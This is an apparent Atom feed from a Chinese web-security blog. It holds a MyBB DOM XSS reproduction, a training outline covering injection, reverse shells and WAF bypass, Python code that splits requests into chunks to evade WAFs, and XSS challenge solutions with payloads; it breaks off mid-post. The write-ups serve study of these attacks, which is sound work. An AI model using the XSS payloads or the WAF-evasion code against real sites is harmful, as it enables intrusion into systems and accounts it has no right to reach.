<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>p7e4</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://p7e4.js.org/"/>
  <updated>2020-08-12T13:32:33.978Z</updated>
  <id>https://p7e4.js.org/</id>
  
  <author>
    <name>p7e4</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DOM-based XSS in MyBB before 1.8.24(CVE-2020-17447,CVE-2020-15139)</title>
    <link href="https://p7e4.js.org/2020/08/10/mybb-dom-xss/"/>
    <id>https://p7e4.js.org/2020/08/10/mybb-dom-xss/</id>
    <published>2020-08-10T12:21:51.000Z</published>
    <updated>2020-08-12T13:32:33.978Z</updated>
    
    <content type="html"><![CDATA[<p>今早查看邮件注意到MyBB爆出了一个XSS漏洞，跟进看一看</p><h2 id="相关信息"><a href="#相关信息" class="headerlink" title="相关信息"></a>相关信息</h2><ul><li>公开时间: 2020.8.9</li><li>影响版本: &lt;1.8.24</li><li>复现环境: <a href="https://mybb.com/versions/1.8.23/" target="_blank" rel="noopener">https://mybb.com/versions/1.8.23/</a></li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>从<a href="https://nvd.nist.gov/vuln/detail/CVE-2020-17447" target="_blank" rel="noopener">CVE</a>的两条References里</p><blockquote><ul><li><a href="https://blog.mybb.com/2020/08/09/mybb-1-8-24-released-security-release/" target="_blank" rel="noopener">https://blog.mybb.com/2020/08/09/mybb-1-8-24-released-security-release/</a></li><li><a href="https://github.com/mybb/mybb/security/advisories/GHSA-37h7-vfv6-f8rj" target="_blank" rel="noopener">https://github.com/mybb/mybb/security/advisories/GHSA-37h7-vfv6-f8rj</a></li></ul></blockquote><p>可以了解到这是SCEditor(论坛的文本编辑器)在将<code>[align]</code>, <code>[size]</code>, <code>[quote]</code>, 和 <code>[font]</code> 伪标签转换为HTML预览时没有过滤特殊字符导致的DOM XSS<br>复现就很简单了<br>在有编辑器的地方用源文本模式插入<br><code>[align=1&quot;&gt;&lt;svg/onload=alert(/xss/)&gt;&lt;&quot;]test[/align]</code><br>再预览或提交后再编辑即可触发<br><img src="https://i.loli.net/2020/08/10/HkNiuT4xD2d1KLz.png" alt="1.png"><br>利用的话需要在有这个编辑器的时候才能自动触发，比如后台查看用户签名<br>或站内消息，不过需要再点预览才能触发了<br><img src="https://i.loli.net/2020/08/10/oNimuLpckxylYAH.png" alt="2.png"><br><img src="https://i.loli.net/2020/08/10/NzK3TpfDwcU92O7.png" alt="3.png"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><a href="https://mybb.com/download/" target="_blank" rel="noopener">1.8.24</a>版本已<a href="https://github.com/mybb/mybb/commit/37ad29dcd25489a37bdd89ebac761f22492558b0" target="_blank" rel="noopener">修复</a>该问题<br>升级到最新版本即可  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今早查看邮件注意到MyBB爆出了一个XSS漏洞，跟进看一看&lt;/p&gt;
&lt;h2 id=&quot;相关信息&quot;&gt;&lt;a href=&quot;#相关信息&quot; class=&quot;headerlink&quot; title=&quot;相关信息&quot;&gt;&lt;/a&gt;相关信息&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;公开时间: 2020.8.9&lt;/li&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>培训体系之WEB安全</title>
    <link href="https://p7e4.js.org/2020/07/30/web-training/"/>
    <id>https://p7e4.js.org/2020/07/30/web-training/</id>
    <published>2020-07-30T16:36:11.000Z</published>
    <updated>2020-08-12T13:32:33.978Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web安全"><a href="#Web安全" class="headerlink" title="Web安全"></a>Web安全</h1><h2 id="WEB基础知识"><a href="#WEB基础知识" class="headerlink" title="WEB基础知识"></a>WEB基础知识</h2><p><img src="https://pic2.zhimg.com/133c88180340b844466e8fa5552e122b_r.jpg" alt="开局一张图"></p><h3 id="协议基础"><a href="#协议基础" class="headerlink" title="协议基础"></a>协议基础</h3><ul><li>tcp/ip</li><li>URL、域名与DNS</li><li>HTTP协议介绍<ul><li>请求方法</li><li>各字段功能</li><li>状态码</li><li>参数</li><li>跳转</li><li>cookie/session</li><li>编码</li><li>etc…</li></ul></li><li>HTTPS实现原理</li></ul><h3 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h3><ul><li>hackbar</li><li>Fiddler</li><li>Burp Suite基本使用</li><li>https抓包配置</li></ul><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul><li>虚拟机</li><li>PHP(mysql)<ul><li>DVWA</li></ul></li><li>ASPX(mssql)</li><li>JSP</li><li>(Node.js)</li><li>(Flask Django)</li></ul><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><ul><li>关系型数据库简介</li><li>mysql安装配置、基本命令</li><li>SQL基础、相关函数</li><li>相关工具<ul><li>phpmyadmin</li><li>navicat</li></ul></li></ul><h3 id="PHP语言基础"><a href="#PHP语言基础" class="headerlink" title="(PHP语言基础)"></a>(PHP语言基础)</h3><ul><li>基础语法，为后续理解漏洞原理准备</li></ul><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><ul><li>常规搜索语法<ul><li>敏感文件</li></ul></li><li>空间搜索引擎<ul><li>资产相关</li></ul></li></ul><h3 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h3><ul><li>Whois</li><li>备案信息</li><li>CDN<ul><li>寻找真实IP</li><li>SSL证书</li><li>解析记录</li><li>子域名</li><li>邮件头信息</li><li>空间搜索引擎</li><li>国外解析差异</li><li>扫描全网</li><li>源站信息泄露，如phpinfo</li></ul></li></ul><h3 id="子域收集"><a href="#子域收集" class="headerlink" title="子域收集"></a>子域收集</h3><ul><li>利用搜索引擎</li><li>证书透明度</li><li>域传送漏洞</li><li>Passive DNS</li><li>页面内容爬虫</li><li>解析记录</li><li>Rapid7 Open Data</li><li>枚举</li><li>工具<ul><li>OneForAll</li></ul></li></ul><h3 id="网站信息"><a href="#网站信息" class="headerlink" title="网站信息"></a>网站信息</h3><ul><li>端口扫描<ul><li>Nmap</li><li>Zenmap</li><li>RustScan</li><li>masscan</li></ul></li><li>指纹识别<ul><li>响应头</li><li>HTML</li><li>错误页面/模式</li><li>静态资源</li><li>favicon.ico</li><li>图片/logo</li><li>js/css</li><li>robots.txt</li><li>目录特征</li><li>powered by xxx</li><li>相关工具</li><li>webanalyzer/rules</li><li>TideFinger</li><li>whatweb</li></ul></li><li>目录扫描<ul><li>备份文件</li><li>源代码泄露.git/.svn</li><li>压缩包</li><li>txt</li><li>etc…</li></ul></li></ul><h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><ul><li>基本原理</li><li>SQLi-lab、DVWA演示</li><li>分类<ul><li>字符型</li><li>数字型</li><li>搜索型</li></ul></li><li>手工注入</li><li>方法<ul><li>联合查询</li><li>报错</li><li>叠堆</li><li>盲注</li><li>布尔</li><li>时间</li><li>外带</li><li>(宽字节)</li></ul></li><li>注入点</li><li>读写文件</li><li>getshell</li><li>udf提权</li><li>二次注入</li><li>SQLmap使用<ul><li>tamper</li><li>os-shell实现</li><li>etc…</li></ul></li><li>防范<ul><li>过滤</li><li>预编译(参数化)</li><li>误使用</li><li>表列名不可用</li></ul></li></ul><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><ul><li>HTML/JS简介</li><li>cookie/session</li><li>XSS原理</li><li>分类<ul><li>反射型XSS</li><li>储存型XSS</li><li>DOM XSS</li><li>Blind XSS</li></ul></li><li>HTML<ul><li>属性</li><li>事件</li><li>编码</li></ul></li><li>CSP</li><li>同源策略</li><li>CORS/JSONP</li><li>拓展</li><li>XSS平台</li><li>修复建议</li></ul><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><ul><li>原理</li><li>利用<ul><li>xssor.io</li></ul></li><li>防护<ul><li>token</li><li>referer</li><li>samesite</li></ul></li></ul><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><ul><li>简介</li><li>协议</li><li>redis利用</li><li>绕过<ul><li>IP变换(进制、合并)</li><li>xip.io</li><li>URL解析不动</li><li>跳转</li><li>DNS Rebinding</li><li>IDN</li><li>IPv6</li></ul></li></ul><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><ul><li>高发场景</li><li>常见payload<ul><li>分割<code>;</code> <code>||</code> <code>|</code> <code>&amp;&amp;</code> <code>&amp;</code> <code>\r\n</code> 换行</li><li>反引号</li><li><code>$()</code></li></ul></li><li>回显技巧<ul><li>反弹shell</li><li>外带</li><li>DNS</li><li>HTTP</li><li>时间延迟</li></ul></li><li>绕过<ul><li>长度绕过</li><li>通配符</li><li>元字符</li></ul></li></ul><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><ul><li>文件包含<ul><li>远程</li><li>本地</li><li>/proc/self/environ</li><li>session</li><li>日志</li><li>其他上传点</li><li>上传临时文件极限包含</li><li>smb</li></ul></li><li>文件上传<ul><li>目录穿越</li><li>前端绕过</li><li>黑名单</li><li>解析漏洞</li><li>MIME验证</li><li>写htaccess</li><li>条件竞争</li><li>二次渲染</li><li>Windows命名特性</li><li>压缩包解压</li></ul></li></ul><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><ul><li>web敏感信息<ul><li>phpinfo</li><li>任意文件读取(下载)</li><li>目录穿越</li><li>PHP伪协议读取</li><li>备份文件</li><li>敏感文档等</li><li>令牌</li></ul></li><li>外部信息泄露<ul><li>Github</li><li>网盘</li><li>QQ群</li><li>其他三方平台</li></ul></li></ul><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><ul><li>基本语法</li><li>DOS</li><li>任意文件读取</li><li>内网探测</li><li>目录枚举</li><li>外带</li><li>DOC/DOCX/SVG</li></ul><h3 id="模版注入"><a href="#模版注入" class="headerlink" title="模版注入"></a>模版注入</h3><ul><li>基础知识</li><li>常用payload: <code>49</code></li><li>寻找可利用的类</li><li>绕过<ul><li>反转</li><li>拼接</li><li>chr</li></ul></li></ul><h3 id="业务安全-amp-amp-逻辑漏洞"><a href="#业务安全-amp-amp-逻辑漏洞" class="headerlink" title="业务安全 &amp;&amp; 逻辑漏洞"></a>业务安全 &amp;&amp; 逻辑漏洞</h3><ul><li>爆破<ul><li>验证码安全</li><li>终端差异<ul><li>APP</li><li>ios</li><li>android</li><li>WEB</li><li>PC</li><li>mobie</li><li>小程序</li><li>公众号</li></ul></li><li>可识别(OCR)</li><li>重用</li><li>客户端回显</li><li>session为空</li><li>IP限制</li><li>伪造<ul><li>X-Forward-For</li><li>X-Real-IP</li></ul></li><li>代理池</li></ul></li><li>短信轰炸</li><li>弱口令</li><li>撞库</li><li>越权<ul><li>水平</li><li>垂直</li><li>越权获取敏感信息</li><li>电话</li><li>身份证</li><li>密码<br>-照片</li><li>etc…</li></ul></li><li>支付逻辑<ul><li>修改</li><li>价格</li><li>数量</li><li>总金额</li><li>重放</li><li>条件竞争</li></ul></li><li>注册<ul><li>覆盖</li><li>验证绕过</li></ul></li><li>任意密码重置</li><li>任意URL跳转</li></ul><h2 id="通用Bypass-waf技巧"><a href="#通用Bypass-waf技巧" class="headerlink" title="通用Bypass waf技巧"></a>通用Bypass waf技巧</h2><ul><li>waf探测/识别</li><li>Fuzzing方法</li><li>畸形数据包</li><li>http/1.1分块传输</li><li>参数污染</li><li>SQL<ul><li>注释</li></ul></li><li>文件上传<ul><li>等价替换</li><li>无字母webshell</li><li>编码/加密</li></ul></li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h3><ul><li>站点</li><li>漏扫<ul><li>msf</li><li>awvs</li><li>xray</li><li>burp</li><li>goby</li></ul></li><li>webshell管理<ul><li>菜刀</li><li>antSword</li><li>冰蝎</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Web安全&quot;&gt;&lt;a href=&quot;#Web安全&quot; class=&quot;headerlink&quot; title=&quot;Web安全&quot;&gt;&lt;/a&gt;Web安全&lt;/h1&gt;&lt;h2 id=&quot;WEB基础知识&quot;&gt;&lt;a href=&quot;#WEB基础知识&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>requests分块传输</title>
    <link href="https://p7e4.js.org/2020/07/23/requests_chunk/"/>
    <id>https://p7e4.js.org/2020/07/23/requests_chunk/</id>
    <published>2020-07-23T22:15:06.000Z</published>
    <updated>2020-08-12T13:32:33.978Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-分块传输"><a href="#1-分块传输" class="headerlink" title="1.分块传输"></a>1.分块传输</h2><p><img src="https://i.loli.net/2020/07/23/Yw1jcgdlO3eGyVA.png" alt></p><p><img src="https://i.loli.net/2020/07/23/pXuj3Tq2ZC8Ubn7.png" alt></p><p>绕waf利用的是很多waf本身甚至就不支持分块传输，其次是支持不完善，在数据长度的后面还是可以加注释的，比如<br><code>1;asd</code>、<code>1;asd=123</code></p><h2 id="2-内容拆分的几种方法"><a href="#2-内容拆分的几种方法" class="headerlink" title="2.内容拆分的几种方法"></a>2.内容拆分的几种方法</h2><h3 id="按敏感关键词名单拆分"><a href="#按敏感关键词名单拆分" class="headerlink" title="按敏感关键词名单拆分"></a>按敏感关键词名单拆分</h3><p>这也是sqlmap目前的使用的方法<br><img src="https://i.loli.net/2020/07/23/K2N3jpwA5MHFVeI.png" alt></p><p>但对于其他场景，需要手动扩展名单就有点麻烦</p><h3 id="按某个特定标识符拆分"><a href="#按某个特定标识符拆分" class="headerlink" title="按某个特定标识符拆分"></a>按某个特定标识符拆分</h3><p>比如在内容中找到<code>@chunk@</code>就以此为界限将两边内容放在不同的方块中</p><h3 id="按位拆分"><a href="#按位拆分" class="headerlink" title="按位拆分"></a>按位拆分</h3><p>比如每一个或两个字符就为一个分块，过长可能无法切分到敏感关键词，过短分块后的数据包体积就会翻N倍，但一般情况下我觉的这是可以接受的:smile:，所以最后使用了这种方法。  </p><h2 id="3-requests-实现"><a href="#3-requests-实现" class="headerlink" title="3.requests 实现"></a>3.requests 实现</h2><p>requests是不支持请求包分块传输的，而且我们也没有办法控制Content-Type头，但好在实际上Transfer-Encoding的优先级是比Content-Type高的，也就是说两者同时存在时，服务器会默认忽略Content-Type，所以这里也就暂时可以先忽略这个问题了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chunk</span><span class="params">(url, **data)</span>:</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">"Transfer-Encoding"</span>: <span class="string">"chunked"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> data.get(<span class="string">"headers"</span>):</span><br><span class="line">data[<span class="string">"headers"</span>].update(headers)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">data[<span class="string">"headers"</span>] = headers</span><br><span class="line"></span><br><span class="line">post = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data[<span class="string">"data"</span>]:</span><br><span class="line">post += <span class="string">f"1;a=1\r\n<span class="subst">&#123;i&#125;</span>\r\n"</span></span><br><span class="line"></span><br><span class="line">data[<span class="string">"data"</span>] = <span class="string">f"<span class="subst">&#123;post&#125;</span>0\r\n\r\n"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> requests.post(url,**data)</span><br><span class="line"></span><br><span class="line">data = <span class="string">"id=1 and union select 1,2,3 from "</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">r = chunk(<span class="string">"http://www.httpbin.org/post"</span>, data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-分块传输&quot;&gt;&lt;a href=&quot;#1-分块传输&quot; class=&quot;headerlink&quot; title=&quot;1.分块传输&quot;&gt;&lt;/a&gt;1.分块传输&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/07/23/Yw1jcgdlO3eGyV
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>python socket recv()</title>
    <link href="https://p7e4.js.org/2020/06/27/py_socket_feature/"/>
    <id>https://p7e4.js.org/2020/06/27/py_socket_feature/</id>
    <published>2020-06-27T20:48:17.000Z</published>
    <updated>2020-08-12T13:32:33.978Z</updated>
    
    <content type="html"><![CDATA[<p>最近在写一个简单的http库<a href="https://github.com/p7e4/arequest" target="_blank" rel="noopener">arequest</a>用的socket，同时，对于较大的响应包，在HTTP/1.1中服务器通常会用分块传输(对，就是那个可以绕waf的那个分快传输)，详见<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Transfer-Encoding" target="_blank" rel="noopener">Transfer-Encoding</a>  </p><p>即首行是一个16进制数表示接下来一段数据的长度（长度不包括两者后面的<code>\r\n</code>），然后下一行又是一个16进制的长度，直到0为止说明后面不再有数据了<br>绕waf就是利用可以在每个块的长度后面写别名，而waf又没有对这里做正确处理的时候，就会导致敏感关键词被分割<br><img src="https://i.loli.net/2020/06/27/wqWzxTHUtIXPC6r.png" alt>  </p><p>再说回socket，在分块传输的时就要根据长度来<code>recv</code>，然而当我几轮<code>recv</code>后报错了<br><code>ValueError: invalid literal for int() with base 16: &#39;xxxxxx&#39;</code><br>当时还以为是网站问题，后来折腾了一下干脆直接<code>recv()</code>全读出来手调了一下，确实没问题，然后把读取的长度和实际读取长度对比了一下，结果不一样…<br>翻一下文档<br><img src="https://i.loli.net/2020/06/27/uUwhjDFLvKiIZ6X.png" alt="recv.png">  </p><blockquote><p>bufsize 指定一次接收的最大数据量  </p></blockquote><p><strong>也就是说因为网络问题，实际收到多少就是多少了</strong><br>比如你<code>recv(4096)</code>实际可能只能收到1300多  </p><p><img src="https://i.loli.net/2020/06/27/hqDVGjRle9v3c4U.jpg" alt></p><p>解决方案: 放到io.BytesIO里面读  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近在写一个简单的http库&lt;a href=&quot;https://github.com/p7e4/arequest&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;arequest&lt;/a&gt;用的socket，同时，对于较大的响应包，在HTTP/1.1中服务器通常会
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>一起来玩一些BAT的XSS实例</title>
    <link href="https://p7e4.js.org/2020/06/26/bat_xss/"/>
    <id>https://p7e4.js.org/2020/06/26/bat_xss/</id>
    <published>2020-06-26T14:08:11.000Z</published>
    <updated>2020-08-12T13:32:33.978Z</updated>
    
    <content type="html"><![CDATA[<p>今天看先知看到了这个<a href="https://xz.aliyun.com/t/7909" target="_blank" rel="noopener">https://xz.aliyun.com/t/7909</a><br>顺便玩了一下，做下记录  </p><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p><a href="http://px1624.sinaapp.com/test/xsstest1/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest1/</a><br>没给参数，看下源码  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> x=location.hash;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">aa</span>(<span class="params">x</span>)</span>&#123;&#125;;</span></span><br><span class="line"><span class="javascript">setTimeout(<span class="string">"aa('"</span>+x+<span class="string">"')"</span>,<span class="number">100</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Give me xss bypass 1~</span><br></pre></td></tr></table></figure><p>dom型，闭合前后即可<br><code>http://px1624.sinaapp.com/test/xsstest1/#&#39;);alert(&#39;1</code><br>ps: 要在新标签页打开，因为锚的关系  </p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p><a href="http://px1624.sinaapp.com/test/xsstest2/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest2/</a>  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery-3.4.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Give me xss bypass 2~</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">'display:none'</span> <span class="attr">id</span>=<span class="string">'xx'</span>&gt;</span><span class="symbol">&amp;lt;</span>img src=x onerror=alert(1)<span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'button'</span> <span class="attr">value</span>=<span class="string">'test'</span> <span class="attr">onclick</span>=<span class="string">'alert("å“ˆå“ˆï¼Œç‚¹è¿™çŽ©æ„æ²¡å•¥ç”¨çš„ï¼")'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">   <span class="keyword">var</span> query = <span class="built_in">window</span>.location.search.substring(<span class="number">1</span>);</span></span><br><span class="line"><span class="javascript">   <span class="keyword">var</span> vars = query.split(<span class="string">"&amp;"</span>);</span></span><br><span class="line">   if(vars)&#123;</span><br><span class="line">        aa(vars[0],vars[1])</span><br><span class="line">   &#125;</span><br><span class="line"><span class="javascript">       <span class="function"><span class="keyword">function</span> <span class="title">aa</span>(<span class="params">x,y</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">"#xx"</span>)[x]($(<span class="string">"#xx"</span>)[y]());</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>jquery操作，先看看有哪些方法可以用<br><img src="https://i.loli.net/2020/06/25/hMVTGg3W4e7krAs.png" alt><br>然后明显注意到了html和text<br><img src="https://i.loli.net/2020/06/25/nifKcM3JYvRWBUP.png" alt><br><code>http://px1624.sinaapp.com/test/xsstest2/?html&amp;text</code>  </p><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p><a href="http://px1624.sinaapp.com/test/xsstest3/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest3/</a>  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Give me xss bypass 3~</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery-3.4.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px = <span class="string">''</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (px != <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">$(<span class="string">'xss'</span>).val(<span class="string">''</span>);</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>看完代码一脸懵逼，因为前两题的惯性，还以为是jquery这个版本有问题，最后试了一下才知道px是可控参数（反射性XSS）<br>URL: <code>http://px1624.sinaapp.com/test/xsstest3/?px=payload</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Give me xss bypass 3~</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery-3.4.1.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px = <span class="string">'payload'</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (px != <span class="string">""</span>) &#123;</span></span><br><span class="line"><span class="javascript">$(<span class="string">'xss'</span>).val(<span class="string">'payload'</span>);</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那这里的问题在于有两个输出点，按常规思路逃逸出来后就无法闭合第二处的括号，这和我<a href="/2020/02/14/a_xss/">之前</a>发的那个XSS有点像，但又有些差别<br>这里虽然没有后续的注释可以闭合多行注释，但是因为第一处输出点在引号内，我们可以把单行注释隐藏在字符串中，在后面用它来消除<code>/*</code>的影响<br>URL: <code>http://px1624.sinaapp.com/test/xsstest3/?px=1*/alert(1);a={1:1//%27;/*</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> px = <span class="string">'1*/alert(1);a=&#123;1:1//'</span>;<span class="comment">/*';</span></span><br><span class="line"><span class="comment">if (px != "") &#123;</span></span><br><span class="line"><span class="comment">$('xss').val('1*/</span>alert(<span class="number">1</span>);a=&#123;<span class="number">1</span>:<span class="number">1</span><span class="comment">//';/*');</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure><p>后来看了wp,发现大家都是用运算符做的<code>1&#39; * alert(1) * &#39;1</code>  </p><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p><a href="http://px1624.sinaapp.com/test/xsstest4/" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest4/</a><br>前一题的加强版，过滤了运算符和注释，没做出来，看了下wp，有两种解法：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings" target="_blank" rel="noopener">模板字符串</a><br>URL: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">- 